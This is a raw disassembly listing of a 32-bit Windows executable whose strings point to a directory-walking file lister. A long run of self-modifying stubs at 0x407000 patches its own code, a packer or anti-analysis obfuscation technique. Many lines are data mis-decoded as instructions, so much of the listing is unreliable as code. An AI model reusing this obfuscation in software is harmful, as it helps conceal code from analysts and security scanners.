  403945:	89 45 10             	mov    %eax,0x10(%ebp)
  403948:	eb d3                	jmp    0x40391d
  40394a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40394d:	c6 01 00             	movb   $0x0,(%ecx)
  403950:	8b e5                	mov    %ebp,%esp
  403952:	5d                   	pop    %ebp
  403953:	c2 0c 00             	ret    $0xc
  403956:	e8 f2 66 00 00       	call   0x40a04d
  40395b:	d3 ff                	sar    %cl,%edi
  40395d:	25 04 52 40 00       	and    $0x405204,%eax
  403962:	ff 25 08 52 40 00    	jmp    *0x405208
  403968:	ff 25 0c 52 40 00    	jmp    *0x40520c
  40396e:	e8 bb 51 00 00       	call   0x408b2e
  403973:	33 e8                	xor    %eax,%ebp
  403975:	c7                   	(bad)
  403976:	52                   	push   %edx
  403977:	00 00                	add    %al,(%eax)
  403979:	24 e8                	and    $0xe8,%al
  40397b:	85 43 00             	test   %eax,0x0(%ebx)
  40397e:	00 fa                	add    %bh,%dl
  403980:	e8 c6 7e 00 00       	call   0x40b84b
  403985:	54                   	push   %esp
  403986:	e8 86 4b 00 00       	call   0x408511
  40398b:	ff                   	ljmp   (bad)
  40398c:	e8 8b 46 00 00       	call   0x40801c
  403991:	45                   	inc    %ebp
  403992:	e8 42 3c 00 00       	call   0x4075d9
  403997:	6f                   	outsl  %ds:(%esi),(%dx)
	...
  404004:	5c                   	pop    %esp
  404005:	5c                   	pop    %esp
  404006:	3f                   	aas
  404007:	5c                   	pop    %esp
  404008:	00 00                	add    %al,(%eax)
  40400a:	00 00                	add    %al,(%eax)
  40400c:	20 00                	and    %al,(%eax)
  40400e:	00 00                	add    %al,(%eax)
  404010:	22 00                	and    (%eax),%al
  404012:	00 00                	add    %al,(%eax)
  404014:	5c                   	pop    %esp
  404015:	00 00                	add    %al,(%eax)
  404017:	00 2a                	add    %ch,(%edx)
  404019:	2e 2a 00             	sub    %cs:(%eax),%al
	...
  405000:	ff                   	(bad)
  405001:	ff                   	(bad)
  405002:	ff                   	(bad)
  405003:	ff 00                	incl   (%eax)
	...
  40500d:	49                   	dec    %ecx
  40500e:	6e                   	outsb  %ds:(%esi),(%dx)
  40500f:	66 6f                	outsw  %ds:(%esi),(%dx)
  405011:	72 6d                	jb     0x405080
  405013:	61                   	popa
  405014:	74 69                	je     0x40507f
  405016:	6f                   	outsl  %ds:(%esi),(%dx)
  405017:	6e                   	outsb  %ds:(%esi),(%dx)
  405018:	00 2e                	add    %ch,(%esi)
  40501a:	65 78 65             	gs js  0x405082
  40501d:	00 2e                	add    %ch,(%esi)
  40501f:	00 2f                	add    %ch,(%edi)
  405021:	00 63 3a             	add    %ah,0x3a(%ebx)
  405024:	00 2a                	add    %ch,(%edx)
  405026:	2e 2a 00             	sub    %cs:(%eax),%al
  405029:	43                   	inc    %ebx
  40502a:	6f                   	outsl  %ds:(%esi),(%dx)
  40502b:	75 6c                	jne    0x405099
  40502d:	64 6e                	outsb  %fs:(%esi),(%dx)
  40502f:	27                   	daa
  405030:	74 20                	je     0x405052
  405032:	6f                   	outsl  %ds:(%esi),(%dx)
  405033:	70 65                	jo     0x40509a
  405035:	6e                   	outsb  %ds:(%esi),(%dx)
  405036:	20 74 68 65          	and    %dh,0x65(%eax,%ebp,2)
  40503a:	20 66 69             	and    %ah,0x69(%esi)
  40503d:	6c                   	insb   (%dx),%es:(%edi)
  40503e:	65 21 20             	and    %esp,%gs:(%eax)
  405041:	00 43 3a             	add    %al,0x3a(%ebx)
  405044:	2f                   	das
  405045:	65 78 70             	gs js  0x4050b8
  405048:	2f                   	das
  405049:	00 76 69             	add    %dh,0x69(%esi)
  40504c:	73 75                	jae    0x4050c3
  40504e:	61                   	popa
  40504f:	00 2e                	add    %ch,(%esi)
  405051:	2e 00 20             	add    %ah,%cs:(%eax)
  405054:	5b                   	pop    %ebx
  405055:	46                   	inc    %esi
  405056:	69 6c 65 5d 20 00 20 	imul   $0x5b200020,0x5d(%ebp,%eiz,2),%ebp
  40505d:	5b 
  40505e:	53                   	push   %ebx
  40505f:	75 62                	jne    0x4050c3
  405061:	2d 44 69 72 5d       	sub    $0x5d726944,%eax
  405066:	20 00                	and    %al,(%eax)
  405068:	00 90 90 90 00 00    	add    %dl,0x9090(%eax)
  40506e:	00 00                	add    %al,(%eax)
  405070:	ff                   	(bad)
  405071:	ff                   	(bad)
  405072:	ff                   	(bad)
  405073:	ff 00                	incl   (%eax)
  405075:	00 00                	add    %al,(%eax)
  405077:	00 00                	add    %al,(%eax)
  405079:	10 00                	adc    %al,(%eax)
	...
  405087:	00 44 53 00          	add    %al,0x0(%ebx,%edx,2)
	...
  40509b:	00 e2                	add    %ah,%dl
  40509d:	55                   	push   %ebp
	...
  4050ae:	00 00                	add    %al,(%eax)
  4050b0:	fa                   	cli
  4050b1:	52                   	push   %edx
	...
  4050c2:	00 00                	add    %al,(%eax)
  4050c4:	ac                   	lods   %ds:(%esi),%al
  4050c5:	56                   	push   %esi
	...
  4050d6:	00 00                	add    %al,(%eax)
  4050d8:	90                   	nop
  4050d9:	56                   	push   %esi
	...
  4050ea:	00 00                	add    %al,(%eax)
  4050ec:	72 56                	jb     0x405144
	...
  405106:	00 00                	add    %al,(%eax)
  405108:	f0 52                	lock push %edx
  40510a:	00 00                	add    %al,(%eax)
  40510c:	52                   	push   %edx
  40510d:	53                   	push   %ebx
  40510e:	00 00                	add    %al,(%eax)
  405110:	5c                   	pop    %esp
  405111:	53                   	push   %ebx
  405112:	00 00                	add    %al,(%eax)
  405114:	68 53 00 00 72       	push   $0x72000053
  405119:	53                   	push   %ebx
  40511a:	00 00                	add    %al,(%eax)
  40511c:	7e 53                	jle    0x405171
  40511e:	00 00                	add    %al,(%eax)
  405120:	88 53 00             	mov    %dl,0x0(%ebx)
  405123:	00 92 53 00 00 9c    	add    %dl,-0x63ffffad(%edx)
  405129:	53                   	push   %ebx
  40512a:	00 00                	add    %al,(%eax)
  40512c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40512d:	53                   	push   %ebx
  40512e:	00 00                	add    %al,(%eax)
  405130:	b0 53                	mov    $0x53,%al
  405132:	00 00                	add    %al,(%eax)
  405134:	00 00                	add    %al,(%eax)
  405136:	00 00                	add    %al,(%eax)
  405138:	06                   	push   %es
  405139:	53                   	push   %ebx
  40513a:	00 00                	add    %al,(%eax)
  40513c:	1a 53 00             	sbb    0x0(%ebx),%dl
  40513f:	00 28                	add    %ch,(%eax)
  405141:	53                   	push   %ebx
  405142:	00 00                	add    %al,(%eax)
  405144:	36 53                	ss push %ebx
  405146:	00 00                	add    %al,(%eax)
  405148:	ba 53 00 00 d0       	mov    $0xd0000053,%edx
  40514d:	53                   	push   %ebx
  40514e:	00 00                	add    %al,(%eax)
  405150:	e0 53                	loopne 0x4051a5
  405152:	00 00                	add    %al,(%eax)
  405154:	ec                   	in     (%dx),%al
  405155:	53                   	push   %ebx
  405156:	00 00                	add    %al,(%eax)
  405158:	f8                   	clc
  405159:	53                   	push   %ebx
  40515a:	00 00                	add    %al,(%eax)
  40515c:	04 54                	add    $0x54,%al
  40515e:	00 00                	add    %al,(%eax)
  405160:	12 54 00 00          	adc    0x0(%eax,%eax,1),%dl
  405164:	20 54 00 00          	and    %dl,0x0(%eax,%eax,1)
  405168:	2e 54                	cs push %esp
  40516a:	00 00                	add    %al,(%eax)
  40516c:	3a 54 00 00          	cmp    0x0(%eax,%eax,1),%dl
  405170:	4c                   	dec    %esp
  405171:	54                   	push   %esp
  405172:	00 00                	add    %al,(%eax)
  405174:	68 54 00 00 7e       	push   $0x7e000054
  405179:	54                   	push   %esp
  40517a:	00 00                	add    %al,(%eax)
  40517c:	92                   	xchg   %eax,%edx
  40517d:	54                   	push   %esp
  40517e:	00 00                	add    %al,(%eax)
  405180:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405181:	54                   	push   %esp
  405182:	00 00                	add    %al,(%eax)
  405184:	b2 54                	mov    $0x54,%dl
  405186:	00 00                	add    %al,(%eax)
  405188:	c2 54 00             	ret    $0x54
  40518b:	00 d4                	add    %dl,%ah
  40518d:	54                   	push   %esp
  40518e:	00 00                	add    %al,(%eax)
  405190:	ea 54 00 00 02 55 00 	ljmp   $0x55,$0x2000054
  405197:	00 1a                	add    %bl,(%edx)
  405199:	55                   	push   %ebp
  40519a:	00 00                	add    %al,(%eax)
  40519c:	30 55 00             	xor    %dl,0x0(%ebp)
  40519f:	00 40 55             	add    %al,0x55(%eax)
  4051a2:	00 00                	add    %al,(%eax)
  4051a4:	52                   	push   %edx
  4051a5:	55                   	push   %ebp
  4051a6:	00 00                	add    %al,(%eax)
  4051a8:	5e                   	pop    %esi
  4051a9:	55                   	push   %ebp
  4051aa:	00 00                	add    %al,(%eax)
  4051ac:	74 55                	je     0x405203
  4051ae:	00 00                	add    %al,(%eax)
  4051b0:	88 55 00             	mov    %dl,0x0(%ebp)
  4051b3:	00 98 55 00 00 a8    	add    %bl,-0x57ffffab(%eax)
  4051b9:	55                   	push   %ebp
  4051ba:	00 00                	add    %al,(%eax)
  4051bc:	be 55 00 00 00       	mov    $0x55,%esi
  4051c1:	00 00                	add    %al,(%eax)
  4051c3:	00 cc                	add    %cl,%ah
  4051c5:	55                   	push   %ebp
  4051c6:	00 00                	add    %al,(%eax)
  4051c8:	00 00                	add    %al,(%eax)
  4051ca:	00 00                	add    %al,(%eax)
  4051cc:	f0 55                	lock push %ebp
  4051ce:	00 00                	add    %al,(%eax)
  4051d0:	fe                   	(bad)
  4051d1:	55                   	push   %ebp
  4051d2:	00 00                	add    %al,(%eax)
  4051d4:	1a 56 00             	sbb    0x0(%esi),%dl
  4051d7:	00 2c 56             	add    %ch,(%esi,%edx,2)
  4051da:	00 00                	add    %al,(%eax)
  4051dc:	3e 56                	ds push %esi
  4051de:	00 00                	add    %al,(%eax)
  4051e0:	54                   	push   %esp
  4051e1:	56                   	push   %esi
  4051e2:	00 00                	add    %al,(%eax)
  4051e4:	64 56                	fs push %esi
  4051e6:	00 00                	add    %al,(%eax)
  4051e8:	00 00                	add    %al,(%eax)
  4051ea:	00 00                	add    %al,(%eax)
  4051ec:	7e 56                	jle    0x405244
  4051ee:	00 00                	add    %al,(%eax)
  4051f0:	00 00                	add    %al,(%eax)
  4051f2:	00 00                	add    %al,(%eax)
  4051f4:	9c                   	pushf
  4051f5:	56                   	push   %esi
  4051f6:	00 00                	add    %al,(%eax)
  4051f8:	00 00                	add    %al,(%eax)
  4051fa:	00 00                	add    %al,(%eax)
  4051fc:	98                   	cwtl
  4051fd:	20 01                	and    %al,(%ecx)
  4051ff:	00 a2 20 01 00 ac    	add    %ah,-0x53fffee0(%edx)
  405205:	20 01                	and    %al,(%ecx)
  405207:	00 b8 20 01 00 c2    	add    %bh,-0x3dfffee0(%eax)
  40520d:	20 01                	and    %al,(%ecx)
  40520f:	00 ce                	add    %cl,%dh
  405211:	20 01                	and    %al,(%ecx)
  405213:	00 d8                	add    %bl,%al
  405215:	20 01                	and    %al,(%ecx)
  405217:	00 e2                	add    %ah,%dl
  405219:	20 01                	and    %al,(%ecx)
  40521b:	00 ec                	add    %ch,%ah
  40521d:	20 01                	and    %al,(%ecx)
  40521f:	00 f6                	add    %dh,%dh
  405221:	20 01                	and    %al,(%ecx)
  405223:	00 00                	add    %al,(%eax)
  405225:	21 01                	and    %eax,(%ecx)
  405227:	00 00                	add    %al,(%eax)
  405229:	00 00                	add    %al,(%eax)
  40522b:	00 18                	add    %bl,(%eax)
  40522d:	21 01                	and    %eax,(%ecx)
  40522f:	00 2c 21             	add    %ch,(%ecx,%eiz,1)
  405232:	01 00                	add    %eax,(%eax)
  405234:	3a 21                	cmp    (%ecx),%ah
  405236:	01 00                	add    %eax,(%eax)
  405238:	48                   	dec    %eax
  405239:	21 01                	and    %eax,(%ecx)
  40523b:	00 56 21             	add    %dl,0x21(%esi)
  40523e:	01 00                	add    %eax,(%eax)
  405240:	6c                   	insb   (%dx),%es:(%edi)
  405241:	21 01                	and    %eax,(%ecx)
  405243:	00 7c 21 01          	add    %bh,0x1(%ecx,%eiz,1)
  405247:	00 88 21 01 00 94    	add    %cl,-0x6bfffedf(%eax)
  40524d:	21 01                	and    %eax,(%ecx)
  40524f:	00 a0 21 01 00 ae    	add    %ah,-0x51fffedf(%eax)
  405255:	21 01                	and    %eax,(%ecx)
  405257:	00 bc 21 01 00 ca 21 	add    %bh,0x21ca0001(%ecx,%eiz,1)
  40525e:	01 00                	add    %eax,(%eax)
  405260:	d6                   	salc
  405261:	21 01                	and    %eax,(%ecx)
  405263:	00 e8                	add    %ch,%al
  405265:	21 01                	and    %eax,(%ecx)
  405267:	00 04 22             	add    %al,(%edx,%eiz,1)
  40526a:	01 00                	add    %eax,(%eax)
  40526c:	1a 22                	sbb    (%edx),%ah
  40526e:	01 00                	add    %eax,(%eax)
  405270:	2e 22 01             	and    %cs:(%ecx),%al
  405273:	00 40 22             	add    %al,0x22(%eax)
  405276:	01 00                	add    %eax,(%eax)
  405278:	4e                   	dec    %esi
  405279:	22 01                	and    (%ecx),%al
  40527b:	00 5e 22             	add    %bl,0x22(%esi)
  40527e:	01 00                	add    %eax,(%eax)
  405280:	70 22                	jo     0x4052a4
  405282:	01 00                	add    %eax,(%eax)
  405284:	86 22                	xchg   %ah,(%edx)
  405286:	01 00                	add    %eax,(%eax)
  405288:	9e                   	sahf
  405289:	22 01                	and    (%ecx),%al
  40528b:	00 b6 22 01 00 cc    	add    %dh,-0x33fffede(%esi)
  405291:	22 01                	and    (%ecx),%al
  405293:	00 dc                	add    %bl,%ah
  405295:	22 01                	and    (%ecx),%al
  405297:	00 ee                	add    %ch,%dh
  405299:	22 01                	and    (%ecx),%al
  40529b:	00 fa                	add    %bh,%dl
  40529d:	22 01                	and    (%ecx),%al
  40529f:	00 10                	add    %dl,(%eax)
  4052a1:	23 01                	and    (%ecx),%eax
  4052a3:	00 24 23             	add    %ah,(%ebx,%eiz,1)
  4052a6:	01 00                	add    %eax,(%eax)
  4052a8:	34 23                	xor    $0x23,%al
  4052aa:	01 00                	add    %eax,(%eax)
  4052ac:	44                   	inc    %esp
  4052ad:	23 01                	and    (%ecx),%eax
  4052af:	00 5a 23             	add    %bl,0x23(%edx)
  4052b2:	01 00                	add    %eax,(%eax)
  4052b4:	00 00                	add    %al,(%eax)
  4052b6:	00 00                	add    %al,(%eax)
  4052b8:	76 23                	jbe    0x4052dd
  4052ba:	01 00                	add    %eax,(%eax)
  4052bc:	00 00                	add    %al,(%eax)
  4052be:	00 00                	add    %al,(%eax)
  4052c0:	98                   	cwtl
  4052c1:	23 01                	and    (%ecx),%eax
  4052c3:	00 a6 23 01 00 c2    	add    %ah,-0x3dfffedd(%esi)
  4052c9:	23 01                	and    (%ecx),%eax
  4052cb:	00 d4                	add    %dl,%ah
  4052cd:	23 01                	and    (%ecx),%eax
  4052cf:	00 e6                	add    %ah,%dh
  4052d1:	23 01                	and    (%ecx),%eax
  4052d3:	00 fc                	add    %bh,%ah
  4052d5:	23 01                	and    (%ecx),%eax
  4052d7:	00 0c 24             	add    %cl,(%esp)
  4052da:	01 00                	add    %eax,(%eax)
  4052dc:	00 00                	add    %al,(%eax)
  4052de:	00 00                	add    %al,(%eax)
  4052e0:	26 24 01             	es and $0x1,%al
  4052e3:	00 00                	add    %al,(%eax)
  4052e5:	00 00                	add    %al,(%eax)
  4052e7:	00 42 24             	add    %al,0x24(%edx)
  4052ea:	01 00                	add    %eax,(%eax)
	...
  407000:	8f 05 2d 70 40 00    	pop    0x40702d
  407006:	50                   	push   %eax
  407007:	b8 9f 3a ef 42       	mov    $0x42ef3a9f,%eax
  40700c:	8d 80 c9 d9 10 bd    	lea    -0x42ef2637(%eax),%eax
  407012:	87 05 1b 70 40 00    	xchg   %eax,0x40701b
  407018:	58                   	pop    %eax
  407019:	f3 90                	pause
  40701b:	43                   	inc    %ebx
  40701c:	ed                   	in     (%dx),%eax
  40701d:	1d 31 00 50 66       	sbb    $0x66500031,%eax
  407022:	b8 eb e9 66 87       	mov    $0x8766e9eb,%eax
  407027:	05 1b 70 40 00       	add    $0x40701b,%eax
  40702c:	b8 48 05 7c c0       	mov    $0xc07c0548,%eax
  407031:	87 04 24             	xchg   %eax,(%esp)
  407034:	c3                   	ret
  407035:	8f 05 63 70 40 00    	pop    0x407063
  40703b:	50                   	push   %eax
  40703c:	8b 05 2d 70 40 00    	mov    0x40702d,%eax
  407042:	8d 80 63 f0 bf ff    	lea    -0x400f9d(%eax),%eax
  407048:	87 05 51 70 40 00    	xchg   %eax,0x407051
  40704e:	58                   	pop    %eax
  40704f:	f3 90                	pause
  407051:	16                   	push   %ss
  407052:	e9 4a c7 00 50       	jmp    0x504137a1
  407057:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40705b:	66 87 05 51 70 40 00 	xchg   %ax,0x407051
  407062:	b8 7b bd 86 af       	mov    $0xaf86bd7b,%eax
  407067:	87 04 24             	xchg   %eax,(%esp)
  40706a:	c3                   	ret
  40706b:	8f 05 99 70 40 00    	pop    0x407099
  407071:	50                   	push   %eax
  407072:	8b 05 63 70 40 00    	mov    0x407063,%eax
  407078:	8d 80 5e a8 16 40    	lea    0x4016a85e(%eax),%eax
  40707e:	87 05 87 70 40 00    	xchg   %eax,0x407087
  407084:	58                   	pop    %eax
  407085:	f3 90                	pause
  407087:	b4 d7                	mov    $0xd7,%ah
  407089:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40708a:	ca 00 50             	lret   $0x5000
  40708d:	66 b8 eb e8          	mov    $0xe8eb,%ax
  407091:	66 87 05 87 70 40 00 	xchg   %ax,0x407087
  407098:	b8 dd a6 1d 72       	mov    $0x721da6dd,%eax
  40709d:	87 04 24             	xchg   %eax,(%esp)
  4070a0:	c3                   	ret
  4070a1:	8f 05 cf 70 40 00    	pop    0x4070cf
  4070a7:	50                   	push   %eax
  4070a8:	8b 05 99 70 40 00    	mov    0x407099,%eax
  4070ae:	8d 80 d9 3e 6f ff    	lea    -0x90c127(%eax),%eax
  4070b4:	87 05 bd 70 40 00    	xchg   %eax,0x4070bd
  4070ba:	58                   	pop    %eax
  4070bb:	f3 90                	pause
  4070bd:	06                   	push   %es
  4070be:	7f 56                	jg     0x407116
  4070c0:	3c ff                	cmp    $0xff,%al
  4070c2:	50                   	push   %eax
  4070c3:	66 b8 eb e8          	mov    $0xe8eb,%ax
  4070c7:	66 87 05 bd 70 40 00 	xchg   %ax,0x4070bd
  4070ce:	b8 20 81 23 1b       	mov    $0x1b238120,%eax
  4070d3:	87 04 24             	xchg   %eax,(%esp)
  4070d6:	c3                   	ret
  4070d7:	8f 05 06 71 40 00    	pop    0x407106
  4070dd:	50                   	push   %eax
  4070de:	90                   	nop
  4070df:	b8 14 10 40 00       	mov    $0x401014,%eax
  4070e4:	8d 80 eb 15 bc 51    	lea    0x51bc15eb(%eax),%eax
  4070ea:	87 05 f3 70 40 00    	xchg   %eax,0x4070f3
  4070f0:	58                   	pop    %eax
  4070f1:	f3 90                	pause
  4070f3:	4f                   	dec    %edi
  4070f4:	20 d4                	and    %dl,%ah
  4070f6:	2f                   	das
  4070f7:	40                   	inc    %eax
  4070f8:	00 50 66             	add    %dl,0x66(%eax)
  4070fb:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407100:	05 f3 70 40 00       	add    $0x4070f3,%eax
  407105:	b8 e4 13 a5 85       	mov    $0x85a513e4,%eax
  40710a:	8d 40 01             	lea    0x1(%eax),%eax
  40710d:	87 04 24             	xchg   %eax,(%esp)
  407110:	c3                   	ret
  407111:	8f 05 3f 71 40 00    	pop    0x40713f
  407117:	50                   	push   %eax
  407118:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40711e:	8d 80 53 e0 bf ff    	lea    -0x401fad(%eax),%eax
  407124:	87 05 2d 71 40 00    	xchg   %eax,0x40712d
  40712a:	58                   	pop    %eax
  40712b:	f3 90                	pause
  40712d:	86 73 65             	xchg   %dh,0x65(%ebx)
  407130:	90                   	nop
  407131:	00 50 66             	add    %dl,0x66(%eax)
  407134:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407139:	05 2d 71 40 00       	add    $0x40712d,%eax
  40713e:	b8 c6 bf 16 79       	mov    $0x7916bfc6,%eax
  407143:	87 04 24             	xchg   %eax,(%esp)
  407146:	c3                   	ret
  407147:	8f 05 75 71 40 00    	pop    0x407175
  40714d:	50                   	push   %eax
  40714e:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407154:	8d 80 d3 8e 6e ff    	lea    -0x91712d(%eax),%eax
  40715a:	87 05 63 71 40 00    	xchg   %eax,0x407163
  407160:	58                   	pop    %eax
  407161:	f3 90                	pause
  407163:	e2 c1                	loop   0x407126
  407165:	d1 c9                	ror    $1,%ecx
  407167:	ff 50 66             	call   *0x66(%eax)
  40716a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40716f:	05 63 71 40 00       	add    $0x407163,%eax
  407174:	b8 7b 2a bb 5e       	mov    $0x5ebb2a7b,%eax
  407179:	87 04 24             	xchg   %eax,(%esp)
  40717c:	c3                   	ret
  40717d:	8f 05 ac 71 40 00    	pop    0x4071ac
  407183:	50                   	push   %eax
  407184:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40718a:	8d 80 ea 05 ec 51    	lea    0x51ec05ea(%eax),%eax
  407190:	87 05 99 71 40 00    	xchg   %eax,0x407199
  407196:	58                   	pop    %eax
  407197:	f3 90                	pause
  407199:	b7 c5                	mov    $0xc5,%bh
  40719b:	bb a6 40 00 50       	mov    $0x500040a6,%ebx
  4071a0:	66 b8 eb e8          	mov    $0xe8eb,%ax
  4071a4:	66 87 05 99 71 40 00 	xchg   %ax,0x407199
  4071ab:	b8 72 ee f4 a5       	mov    $0xa5f4ee72,%eax
  4071b0:	8d 40 01             	lea    0x1(%eax),%eax
  4071b3:	87 04 24             	xchg   %eax,(%esp)
  4071b6:	c3                   	ret
  4071b7:	8f 05 e5 71 40 00    	pop    0x4071e5
  4071bd:	50                   	push   %eax
  4071be:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4071c4:	8d 80 8e 9c 16 40    	lea    0x40169c8e(%eax),%eax
  4071ca:	87 05 d3 71 40 00    	xchg   %eax,0x4071d3
  4071d0:	58                   	pop    %eax
  4071d1:	f3 90                	pause
  4071d3:	37                   	aaa
  4071d4:	45                   	inc    %ebp
  4071d5:	ed                   	in     (%dx),%eax
  4071d6:	ed                   	in     (%dx),%eax
  4071d7:	00 50 66             	add    %dl,0x66(%eax)
  4071da:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4071df:	05 d3 71 40 00       	add    $0x4071d3,%eax
  4071e4:	b8 a9 af 2f 6a       	mov    $0x6a2fafa9,%eax
  4071e9:	87 04 24             	xchg   %eax,(%esp)
  4071ec:	c3                   	ret
  4071ed:	8f 05 1b 72 40 00    	pop    0x40721b
  4071f3:	50                   	push   %eax
  4071f4:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4071fa:	8d 80 53 e0 bf ff    	lea    -0x401fad(%eax),%eax
  407200:	87 05 09 72 40 00    	xchg   %eax,0x407209
  407206:	58                   	pop    %eax
  407207:	f3 90                	pause
  407209:	fd                   	std
  40720a:	95                   	xchg   %eax,%ebp
  40720b:	94                   	xchg   %eax,%esp
  40720c:	b1 00                	mov    $0x0,%cl
  40720e:	50                   	push   %eax
  40720f:	66 b8 eb e8          	mov    $0xe8eb,%ax
  407213:	66 87 05 09 72 40 00 	xchg   %ax,0x407209
  40721a:	b8 b3 00 69 b2       	mov    $0xb26900b3,%eax
  40721f:	87 04 24             	xchg   %eax,(%esp)
  407222:	c3                   	ret
  407223:	8f 05 51 72 40 00    	pop    0x407251
  407229:	50                   	push   %eax
  40722a:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407230:	8d 80 53 e0 cf ff    	lea    -0x301fad(%eax),%eax
  407236:	87 05 3f 72 40 00    	xchg   %eax,0x40723f
  40723c:	58                   	pop    %eax
  40723d:	f3 90                	pause
  40723f:	ed                   	in     (%dx),%eax
  407240:	ac                   	lods   %ds:(%esi),%al
  407241:	1c 33                	sbb    $0x33,%al
  407243:	00 50 66             	add    %dl,0x66(%eax)
  407246:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40724b:	05 3f 72 40 00       	add    $0x40723f,%eax
  407250:	b8 c0 4e a2 1e       	mov    $0x1ea24ec0,%eax
  407255:	87 04 24             	xchg   %eax,(%esp)
  407258:	c3                   	ret
  407259:	8f 05 87 72 40 00    	pop    0x407287
  40725f:	50                   	push   %eax
  407260:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407266:	8d 80 53 e0 bf ff    	lea    -0x401fad(%eax),%eax
  40726c:	87 05 75 72 40 00    	xchg   %eax,0x407275
  407272:	58                   	pop    %eax
  407273:	f3 90                	pause
  407275:	01 1b                	add    %ebx,(%ebx)
  407277:	4e                   	dec    %esi
  407278:	9f                   	lahf
  407279:	00 50 66             	add    %dl,0x66(%eax)
  40727c:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407281:	05 75 72 40 00       	add    $0x407275,%eax
  407286:	b8 68 50 31 2f       	mov    $0x2f315068,%eax
  40728b:	87 04 24             	xchg   %eax,(%esp)
  40728e:	c3                   	ret
  40728f:	8f 05 bd 72 40 00    	pop    0x4072bd
  407295:	50                   	push   %eax
  407296:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40729c:	8d 80 d3 4c 6d ff    	lea    -0x92b32d(%eax),%eax
  4072a2:	87 05 ab 72 40 00    	xchg   %eax,0x4072ab
  4072a8:	58                   	pop    %eax
  4072a9:	f3 90                	pause
  4072ab:	d5 8b                	aad    $0x8b
  4072ad:	b2 d5                	mov    $0xd5,%dl
  4072af:	ff 50 66             	call   *0x66(%eax)
  4072b2:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4072b7:	05 ab 72 40 00       	add    $0x4072ab,%eax
  4072bc:	b8 a5 95 ee dc       	mov    $0xdcee95a5,%eax
  4072c1:	87 04 24             	xchg   %eax,(%esp)
  4072c4:	c3                   	ret
  4072c5:	8f 05 f4 72 40 00    	pop    0x4072f4
  4072cb:	50                   	push   %eax
  4072cc:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4072d2:	8d 80 ea 05 f0 51    	lea    0x51f005ea(%eax),%eax
  4072d8:	87 05 e1 72 40 00    	xchg   %eax,0x4072e1
  4072de:	58                   	pop    %eax
  4072df:	f3 90                	pause
  4072e1:	0d ef eb 80 40       	or     $0x4080ebef,%eax
  4072e6:	00 50 66             	add    %dl,0x66(%eax)
  4072e9:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4072ee:	05 e1 72 40 00       	add    $0x4072e1,%eax
  4072f3:	b8 d8 76 58 f3       	mov    $0xf35876d8,%eax
  4072f8:	8d 40 01             	lea    0x1(%eax),%eax
  4072fb:	87 04 24             	xchg   %eax,(%esp)
  4072fe:	c3                   	ret
  4072ff:	8f 05 2d 73 40 00    	pop    0x40732d
  407305:	50                   	push   %eax
  407306:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40730c:	8d 80 8e 98 16 40    	lea    0x4016988e(%eax),%eax
  407312:	87 05 1b 73 40 00    	xchg   %eax,0x40731b
  407318:	58                   	pop    %eax
  407319:	f3 90                	pause
  40731b:	9d                   	popf
  40731c:	96                   	xchg   %eax,%esi
  40731d:	e1 0a                	loope  0x407329
  40731f:	00 50 66             	add    %dl,0x66(%eax)
  407322:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407327:	05 1b 73 40 00       	add    $0x40731b,%eax
  40732c:	b8 6c ff e0 22       	mov    $0x22e0ff6c,%eax
  407331:	87 04 24             	xchg   %eax,(%esp)
  407334:	c3                   	ret
  407335:	8f 05 63 73 40 00    	pop    0x407363
  40733b:	50                   	push   %eax
  40733c:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407342:	8d 80 d3 6a 82 ff    	lea    -0x7d952d(%eax),%eax
  407348:	87 05 51 73 40 00    	xchg   %eax,0x407351
  40734e:	58                   	pop    %eax
  40734f:	f3 90                	pause
  407351:	de 3b                	fidivrs (%ebx)
  407353:	39 ab ff 50 66 b8    	cmp    %ebp,-0x4799af01(%ebx)
  407359:	eb e8                	jmp    0x407343
  40735b:	66 87 05 51 73 40 00 	xchg   %ax,0x407351
  407362:	b8 5e 28 ea f3       	mov    $0xf3ea285e,%eax
  407367:	87 04 24             	xchg   %eax,(%esp)
  40736a:	c3                   	ret
  40736b:	8f 05 99 73 40 00    	pop    0x407399
  407371:	50                   	push   %eax
  407372:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407378:	8d 80 53 e0 cf ff    	lea    -0x301fad(%eax),%eax
  40737e:	87 05 87 73 40 00    	xchg   %eax,0x407387
  407384:	58                   	pop    %eax
  407385:	f3 90                	pause
  407387:	7b 25                	jnp    0x4073ae
  407389:	49                   	dec    %ecx
  40738a:	e5 00                	in     $0x0,%eax
  40738c:	50                   	push   %eax
  40738d:	66 b8 eb e8          	mov    $0xe8eb,%ax
  407391:	66 87 05 87 73 40 00 	xchg   %ax,0x407387
  407398:	b8 d1 21 14 07       	mov    $0x71421d1,%eax
  40739d:	87 04 24             	xchg   %eax,(%esp)
  4073a0:	c3                   	ret
  4073a1:	8f 05 d0 73 40 00    	pop    0x4073d0
  4073a7:	50                   	push   %eax
  4073a8:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4073ae:	8d 80 ea f5 ef 51    	lea    0x51eff5ea(%eax),%eax
  4073b4:	87 05 bd 73 40 00    	xchg   %eax,0x4073bd
  4073ba:	58                   	pop    %eax
  4073bb:	f3 90                	pause
  4073bd:	21 56 ce             	and    %edx,-0x32(%esi)
